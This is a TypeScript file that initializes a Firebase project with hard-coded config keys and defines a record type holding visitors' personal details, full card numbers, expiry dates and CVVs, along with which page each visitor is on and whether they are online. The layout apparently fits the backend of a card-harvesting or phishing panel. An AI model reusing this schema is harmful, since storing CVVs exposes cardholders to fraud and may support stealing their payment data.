import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore } from 'firebase/firestore';
import { getDatabase } from 'firebase/database';

const firebaseConfig = {
  apiKey: "AIzaSyAEpd6TtW7G3pDRXIw242Aqk61GbHJv0ck",
  authDomain: "my-lead-ec3e9.firebaseapp.com",
  databaseURL: "https://my-lead-ec3e9.firebaseio.com",
  projectId: "my-lead-ec3e9",
  storageBucket: "my-lead-ec3e9.firebasestorage.app",
  messagingSenderId: "796465788377",
  appId: "1:796465788377:web:c4ddb4d0aebf74cb2155c8",
  measurementId: "G-0GPMPSVBEW"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);
export { app, auth, db,database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
  isOnline?: boolean
  lastSeen: string
}
